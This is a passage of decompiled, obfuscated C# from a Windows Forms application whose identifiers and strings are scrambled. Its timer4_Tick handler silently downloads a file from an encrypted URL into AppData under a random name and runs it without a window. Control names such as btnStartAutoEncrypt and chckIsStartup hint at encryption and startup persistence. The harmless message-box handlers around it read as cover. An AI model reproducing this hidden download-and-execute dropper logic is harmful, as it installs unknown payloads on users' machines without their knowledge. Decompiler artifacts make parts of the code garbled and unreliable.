			if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
			{
				goto IL_0026;
			}
		}
		else
		{
			num = 4;
		}
		goto IL_0090;
		IL_00b1:
		num = 2;
		if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
		{
			return;
		}
		goto IL_0090;
		IL_0026:
		((ListControl)comboBox1).set_DisplayMember(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(308));
		int num2 = 5;
		goto IL_0094;
		IL_0090:
		num2 = num;
		goto IL_0094;
		IL_0094:
		switch (num2)
		{
		case 2:
			break;
		case 0:
		case 3:
			comboBox1.set_DataSource((object)_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(300));
			goto case 1;
		case 1:
		case 4:
			((ListControl)comboBox1).set_ValueMember(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(304));
			break;
		default:
			goto IL_00b1;
		case 5:
			return;
		}
		goto IL_0026;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void timer4_Tick(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0033
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0159: Incompatible stack heights: 0 vs 1
		int num = 13;
		Process process = default(Process);
		string randomFileName = default(string);
		string fileName = default(string);
		WebClient webClient = default(WebClient);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				IL_003c:
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 3:
						break;
					case 7:
					case 14:
						process.StartInfo.UseShellExecute = false;
						goto case 12;
					default:
						num2 = 12;
						if (true)
						{
							goto IL_003c;
						}
						goto case 12;
					case 12:
						process.StartInfo.CreateNoWindow = true;
						num = 6;
						goto end_IL_0040;
					case 8:
						randomFileName = Path.GetRandomFileName();
						num = 11;
						goto end_IL_0040;
					case 15:
						do
						{
							webBrowser1.Navigate(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(312));
							num2 = 3;
						}
						while (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091());
						goto IL_003c;
					case 0:
					case 10:
						process.StartInfo.FileName = fileName;
						num = 9;
						goto end_IL_0040;
					case 1:
						webClient.DownloadFile(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(320), fileName);
						num = 4;
						goto end_IL_0040;
					case 6:
						process.StartInfo.RedirectStandardOutput = true;
						goto case 0;
					case 5:
						process.WaitForExit();
						num3 = 16;
						continue;
					case 4:
						process = new Process();
						_ = 0;
						if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							num3 = 0;
							continue;
						}
						num2 = 14;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto IL_003c;
						}
						goto case 11;
					case 11:
						fileName = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + randomFileName + _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(316);
						num2 = 1;
						if (true)
						{
							goto IL_003c;
						}
						goto case 9;
					case 9:
						process.Start();
						num2 = 2;
						if (true)
						{
							goto IL_003c;
						}
						goto case 2;
					case 2:
					{
						string text = process.StandardOutput.ReadToEnd();
						num = 5;
						goto end_IL_0040;
					}
					case 13:
						if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(68))
						{
							num = 15;
							goto end_IL_0040;
						}
						return;
					case 16:
						return;
					}
					webClient = new WebClient();
					num = 8;
					break;
					continue;
					end_IL_0040:
					break;
				}
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void checkBox1_CheckedChanged(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_01a6
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_0070: Unknown result type (might be due to invalid IL or missing references)
		//IL_00f9: Unknown result type (might be due to invalid IL or missing references)
		int num = 15;
		if (false)
		{
			goto IL_0016;
		}
		goto IL_01af;
		IL_01af:
		int num2 = num;
		goto IL_01b3;
		IL_01b3:
		char[] array = default(char[]);
		int num5 = default(int);
		bool flag = default(bool);
		int num3 = default(int);
		bool flag2 = default(bool);
		while (true)
		{
			int num4;
			switch (num2)
			{
			case 2:
				break;
			case 13:
				array[4] = 'E';
				num4 = 11;
				goto IL_01ab;
			case 15:
				goto IL_0032;
			case 12:
				num5++;
				num = 14;
				goto IL_01af;
			case 17:
				if (flag)
				{
					MessageBox.Show(array[num3].ToString());
					num = 5;
					if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
					{
						goto case 7;
					}
					goto IL_01af;
				}
				num2 = 6;
				continue;
			case 1:
				array[3] = 'D';
				num4 = 13;
				goto IL_01ab;
			case 9:
				if (!flag2)
				{
					num = 20;
					if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
					{
						goto case 12;
					}
					goto IL_01af;
				}
				MessageBox.Show(array[num5].ToString());
				num2 = 12;
				continue;
			case 3:
				return;
			case 16:
				array[1] = 'B';
				_ = 0;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					num4 = 0;
					goto IL_01ab;
				}
				num2 = 10;
				continue;
			case 6:
				Array.Resize(ref array, 3);
				num2 = 2;
				continue;
			case 0:
			case 4:
				array[2] = 'C';
				num = 1;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 9;
				}
				goto IL_01af;
			case 11:
				num3 = 0;
				goto case 7;
			case 7:
			case 8:
			case 10:
				flag = num3 < array.Length;
				num = 17;
				if (1 == 0)
				{
					goto case 14;
				}
				goto IL_01af;
			case 14:
			case 19:
				flag2 = num5 < array.Length;
				num4 = 9;
				goto IL_01ab;
			case 18:
				array[0] = 'A';
				num4 = 16;
				goto IL_01ab;
			case 5:
				num3++;
				goto case 7;
			default:
				num = 7;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					return;
				}
				goto IL_01af;
			case 20:
				return;
				IL_01ab:
				num = num4;
				goto IL_01af;
			}
			break;
			IL_0032:
			if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(72))
			{
				num2 = 3;
				continue;
			}
			array = new char[5];
			num = 18;
			goto IL_01af;
		}
		goto IL_0016;
		IL_0016:
		num5 = 0;
		num2 = 19;
		goto IL_01b3;
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void button6_Click(object _0020, EventArgs _0020)
	{
		//Discarded unreachable code: IL_0005, IL_0048, IL_010c
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0101: Unknown result type (might be due to invalid IL or missing references)
		//IL_01bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_021c: Incompatible stack heights: 0 vs 1
		//IL_032e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0375: Unknown result type (might be due to invalid IL or missing references)
		//IL_041a: Unknown result type (might be due to invalid IL or missing references)
		int num = 19;
		string[] array = default(string[]);
		bool flag2 = default(bool);
		List<string> list2 = default(List<string>);
		int num5 = default(int);
		int num4 = default(int);
		List<string> list = default(List<string>);
		string[] array2 = default(string[]);
		bool flag = default(bool);
		string text = default(string);
		int count = default(int);
		List<string>.Enumerator enumerator = default(List<string>.Enumerator);
		while (true)
		{
			int num2 = num;
			while (true)
			{
				int num3 = num2;
				while (true)
				{
					switch (num3)
					{
					case 15:
						break;
					case 13:
						array[1] = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(328);
						num2 = 27;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto end_IL_0119;
						}
						goto case 27;
					case 27:
						array[2] = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(332);
						num2 = 31;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto end_IL_0119;
						}
						goto case 7;
					case 7:
						MessageBox.Show(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(340));
						goto case 9;
					default:
						num2 = 29;
						if (true)
						{
							goto end_IL_0119;
						}
						goto case 2;
					case 28:
						if (flag2)
						{
							MessageBox.Show(list2[num5]);
							goto case 10;
						}
						num3 = 17;
						continue;
					case 14:
						list2.Add(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(324));
						num2 = 4;
						if (true)
						{
							goto end_IL_0119;
						}
						goto case 20;
					case 20:
						list2.Add(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(332));
						_ = 1;
						num = ((!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091()) ? 21 : 23);
						goto end_IL_0115;
					case 19:
						if (_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.EmWT1u1C4(76))
						{
							num3 = 22;
							continue;
						}
						return;
					case 25:
						num4++;
						num2 = 30;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0119;
						}
						goto case 31;
					case 31:
						list = new List<string>(array);
						array2 = array;
						num = 24;
						goto end_IL_0115;
					case 17:
						flag = list2.Contains(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(328));
						num2 = 11;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0119;
						}
						goto case 2;
					case 2:
					case 18:
						flag2 = num5 < list2.Count;
						num3 = 28;
						continue;
					case 22:
						list2 = new List<string>();
						num2 = 14;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto end_IL_0119;
						}
						goto case 4;
					case 6:
						num5 = 0;
						num3 = 2;
						continue;
					case 4:
						list2.Add(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(328));
						num2 = 20;
						goto end_IL_0119;
					case 10:
					case 23:
						num5++;
						num2 = 18;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0119;
						}
						goto case 9;
					case 9:
					case 29:
						array = new string[3];
						num2 = 16;
						if (0 == 0)
						{
							goto end_IL_0119;
						}
						goto case 3;
					case 3:
						MessageBox.Show(text);
						num = 25;
						goto end_IL_0115;
					case 11:
						if (flag)
						{
							num2 = 7;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								goto end_IL_0119;
							}
							goto case 0;
						}
						MessageBox.Show(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(344));
						num2 = 9;
						if (true)
						{
							goto end_IL_0119;
						}
						goto case 5;
					case 12:
						MessageBox.Show(count.ToString());
						num2 = 32;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0119;
						}
						goto case 9;
					case 24:
						num4 = 0;
						num3 = 0;
						continue;
					case 26:
						enumerator = list2.GetEnumerator();
						num2 = 15;
						if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
						{
							goto end_IL_0119;
						}
						goto case 16;
					case 16:
						array[0] = _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(324);
						num2 = 13;
						goto end_IL_0119;
					case 0:
					case 30:
						if (num4 < array2.Length)
						{
							text = array2[num4];
							num3 = 3;
							continue;
						}
						num2 = 1;
						goto end_IL_0119;
					case 1:
						list.Clear();
						num2 = 8;
						if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto end_IL_0119;
						}
						goto case 9;
					case 5:
					case 21:
						list2.Insert(1, _008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(336));
						num = 26;
						goto end_IL_0115;
					case 8:
						count = list.Count;
						num2 = 12;
						if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
						{
							goto case 0;
						}
						goto end_IL_0119;
					case 32:
						return;
					}
					try
					{
						while (enumerator.MoveNext())
						{
							string current = enumerator.Current;
							_ = 1;
							int num7;
							if (!_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
							{
								int num6 = 2;
								if (1 == 0)
								{
									goto IL_003a;
								}
								num7 = num6;
							}
							else
							{
								num7 = 3;
							}
							switch (num7)
							{
							case 0:
							case 2:
								break;
							default:
								continue;
							}
							goto IL_003a;
							IL_003a:
							MessageBox.Show(current);
						}
					}
					finally
					{
						((IDisposable)enumerator).Dispose();
					}
					list2.Remove(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(336));
					num = 6;
					goto end_IL_0115;
					continue;
					end_IL_0119:
					break;
				}
				continue;
				end_IL_0115:
				break;
			}
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void backgroundWorker1_DoWork(object _0020, DoWorkEventArgs _0020)
	{
	}//Discarded unreachable code: IL_0005
	//IL_0006: Incompatible stack heights: 0 vs 1


	[MethodImpl(MethodImplOptions.NoInlining)]
	protected override void Dispose(bool _0020)
	{
		//Discarded unreachable code: IL_0005, IL_002e
		//IL_0006: Incompatible stack heights: 0 vs 1
		_ = 0;
		int num = ((!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092()) ? 3 : 5);
		while (true)
		{
			int num2;
			switch (num)
			{
			case 2:
			case 3:
				components.Dispose();
				break;
			default:
				num2 = 1;
				if (1 == 0)
				{
					break;
				}
				goto IL_0037;
			case 1:
				break;
			case 4:
				if (components == null)
				{
					break;
				}
				goto case 2;
			case 0:
			case 5:
				if (!_0020)
				{
					break;
				}
				num2 = 4;
				goto IL_0037;
			case 6:
				return;
				IL_0037:
				num = num2;
				continue;
			}
			((Form)this).Dispose(_0020);
			num = 6;
		}
	}

	[MethodImpl(MethodImplOptions.NoInlining)]
	private void InitializeComponent()
	{
		//Discarded unreachable code: IL_0005, IL_0c1c
		//IL_0006: Incompatible stack heights: 0 vs 1
		//IL_00b8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Expected O, but got Unknown
		//IL_00d4: Unknown result type (might be due to invalid IL or missing references)
		//IL_0180: Unknown result type (might be due to invalid IL or missing references)
		//IL_018a: Expected O, but got Unknown
		//IL_0195: Unknown result type (might be due to invalid IL or missing references)
		//IL_019f: Expected O, but got Unknown
		//IL_024d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0257: Expected O, but got Unknown
		//IL_025e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0268: Expected O, but got Unknown
		//IL_02fc: Unknown result type (might be due to invalid IL or missing references)
		//IL_0306: Expected O, but got Unknown
		//IL_0395: Unknown result type (might be due to invalid IL or missing references)
		//IL_039f: Expected O, but got Unknown
		//IL_03ae: Unknown result type (might be due to invalid IL or missing references)
		//IL_03b8: Expected O, but got Unknown
		//IL_0488: Unknown result type (might be due to invalid IL or missing references)
		//IL_0492: Expected O, but got Unknown
		//IL_04a3: Unknown result type (might be due to invalid IL or missing references)
		//IL_04ad: Expected O, but got Unknown
		//IL_0594: Unknown result type (might be due to invalid IL or missing references)
		//IL_059e: Expected O, but got Unknown
		//IL_05fb: Unknown result type (might be due to invalid IL or missing references)
		//IL_0605: Expected O, but got Unknown
		//IL_0836: Unknown result type (might be due to invalid IL or missing references)
		//IL_084b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0855: Expected O, but got Unknown
		//IL_0856: Unknown result type (might be due to invalid IL or missing references)
		//IL_0860: Expected O, but got Unknown
		//IL_08bd: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a77: Unknown result type (might be due to invalid IL or missing references)
		//IL_0a81: Expected O, but got Unknown
		//IL_0b7f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0b89: Expected O, but got Unknown
		//IL_0e58: Incompatible stack heights: 0 vs 1
		//IL_0f15: Unknown result type (might be due to invalid IL or missing references)
		//IL_0f1f: Expected O, but got Unknown
		//IL_11f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_1201: Expected O, but got Unknown
		//IL_12f6: Unknown result type (might be due to invalid IL or missing references)
		//IL_1300: Expected O, but got Unknown
		//IL_1301: Unknown result type (might be due to invalid IL or missing references)
		//IL_130b: Expected O, but got Unknown
		int num = 47;
		ComponentResourceManager componentResourceManager = default(ComponentResourceManager);
		while (true)
		{
			int num3;
			int num2;
			switch (num)
			{
			case 76:
				((Control)this).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(412));
				num3 = 40;
				goto IL_0c21;
			case 8:
				((Control)comboBox1).set_Size(new Size(121, 24));
				num2 = 132;
				goto IL_0c25;
			case 74:
				((Control)button10).set_TabIndex(18);
				num2 = 3;
				if (_008D_0092_0089_0095_0094_008A_008B_0089_008E_0087_008F_0090_008C_0086_008E_008E_0090_0094_0089_0086_008F_0087_008A_0094_0094_0090_0095_008E_0090_0087_0091_0089_0089_0095_0091_0091())
				{
					goto case 108;
				}
				goto IL_0c25;
			case 108:
				((Control)this).get_Controls().Add((Control)(object)comboBox1);
				num2 = 52;
				goto IL_0c25;
			case 61:
				((Control)this).get_Controls().Add((Control)(object)button9);
				num2 = 94;
				if (false)
				{
					goto case 33;
				}
				goto IL_0c25;
			case 33:
				timer3 = new Timer(components);
				num3 = 91;
				goto IL_0c21;
			case 103:
				((Control)chckIsStartup).set_Margin(new Padding(4));
				num2 = 55;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 110;
				}
				goto IL_0c25;
			case 110:
				((Control)btnStartAutoEncrypt).set_Size(new Size(112, 28));
				num = 87;
				break;
			case 106:
				((Control)button3).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(352));
				num2 = 62;
				goto IL_0c25;
			case 14:
				((Control)button8).set_TabIndex(21);
				num2 = 24;
				goto IL_0c25;
			case 48:
				((Control)btnStartAutoEncrypt).set_Enabled(false);
				num = 124;
				break;
			case 26:
				((Control)checkBox1).set_TabIndex(13);
				num3 = 99;
				goto IL_0c21;
			case 101:
				comboBox3 = new ComboBox();
				num = 10;
				break;
			case 77:
				checkBox1 = new CheckBox();
				num = 133;
				break;
			case 131:
				((Control)chckIsStartup).set_AutoSize(true);
				num2 = 121;
				goto IL_0c25;
			case 39:
				((Control)button8).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(364));
				num2 = 42;
				if (false)
				{
					goto case 45;
				}
				goto IL_0c25;
			case 45:
				((Control)comboBox2).set_TabIndex(10);
				num2 = 23;
				goto IL_0c25;
			case 96:
				((Control)button12).set_Text(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(400));
				goto case 7;
			case 114:
				((Control)comboBox3).set_TabIndex(20);
				num2 = 125;
				goto IL_0c25;
			case 91:
				comboBox2 = new ComboBox();
				timer4 = new Timer(components);
				num2 = 77;
				if (false)
				{
					goto case 42;
				}
				goto IL_0c25;
			case 42:
				((Control)button8).set_Size(new Size(75, 23));
				num2 = 14;
				goto IL_0c25;
			case 84:
				((ListControl)comboBox3).set_FormattingEnabled(true);
				num2 = 116;
				goto IL_0c25;
			case 25:
				((Control)button10).set_Size(new Size(75, 23));
				num2 = 74;
				if (1 == 0)
				{
					goto case 120;
				}
				goto IL_0c25;
			case 120:
				checkBox1.add_CheckedChanged((EventHandler)checkBox1_CheckedChanged);
				num3 = 75;
				goto IL_0c21;
			case 10:
				button9 = new Button();
				num = 65;
				break;
			case 31:
				((Control)comboBox2).set_Size(new Size(121, 24));
				num2 = 45;
				goto IL_0c25;
			case 121:
				((Control)chckIsStartup).set_Location(new Point(111, 71));
				num2 = 103;
				if (false)
				{
					goto case 70;
				}
				goto IL_0c25;
			case 70:
				((Control)this).ResumeLayout(false);
				num3 = 92;
				goto IL_0c21;
			case 119:
				((Control)button12).set_Location(new Point(142, 70));
				num2 = 43;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 135;
				}
				goto IL_0c25;
			case 135:
				button1 = new Button();
				num2 = 13;
				goto IL_0c25;
			case 35:
				button3 = new Button();
				num3 = 33;
				goto IL_0c21;
			case 63:
				((Control)this).get_Controls().Add((Control)(object)btnStartAutoEncrypt);
				num2 = 85;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 20;
				}
				goto IL_0c25;
			case 20:
				((Control)checkBox1).set_AutoSize(true);
				num2 = 58;
				if (_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto IL_0c25;
				}
				goto case 125;
			case 51:
				((Control)button11).set_Location(new Point(223, 57));
				num2 = 128;
				if (!_0089_008D_0089_0089_0092_0095_0092_0087_008B_0094_008B_008A_0094_008B_008F_008F_0089_0091_008A_0091_0090_008F_0093_008E_008B_0093_008D_008F_0095_008F_0091_0090_0089_0086_008B_0092())
				{
					goto case 69;
				}
				goto IL_0c25;
			case 69:
				((Control)comboBox1).set_Name(_008D_0091_008A_0089_0089_0086_0087_0087_008E_0090_0094_008F_008F_0094_008A_0095_008C_0093_008C_0095_008F_0090_008F_0087_0088_0087_0091_0086_008D_0094_008D_0094_0094_0094_008F_0090.pA2PN5iOW(380));
				num2 = 8;
				goto IL_0c25;
			case 4:
				((Control)chckIsStartup).set_Size(new Size(213, 21));
				num2 = 97;
				goto IL_0c25;
			case 44:
				timer1 = new Timer(components);
				num3 = 126;
				goto IL_0c21;
			case 32:
				timer5 = new Timer(components);
				num3 = 53;
				goto IL_0c21;
			case 116:
				((Control)comboBox3).set_Location(new Point(177, 40));
